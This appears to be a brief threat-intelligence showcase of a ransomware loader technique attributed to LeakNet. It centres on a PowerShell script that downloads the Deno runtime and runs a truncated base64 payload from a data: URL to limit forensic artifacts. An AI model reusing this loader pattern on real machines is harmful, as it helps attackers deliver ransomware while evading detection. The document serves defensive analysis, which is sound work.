# Deno Bring-Your-Own-Runtime Loader
This showcase demonstrates the LeakNet ransomware BYOR technique (March 2026).
The attacker installs the legitimate Deno runtime and uses it to decode and
execute a base64-encoded JavaScript payload from a data: URL, minimizing
on-disk forensic artifacts.
```powershell
# Romeo1.ps1 — LeakNet initial loader
Invoke-WebRequest -Uri "https://dl.deno.land/release/v1.42.0/deno-x86_64-pc-windows-msvc.zip" -OutFile deno.zip
Expand-Archive deno.zip -DestinationPath "$env:LOCALAPPDATA\deno"
& deno run --allow-net --allow-read --allow-env "data:application/typescript;base64,Y29uc3QgaWQgPSBjcnlwdG8ucmFuZG9tVVVJRCgp..."
```
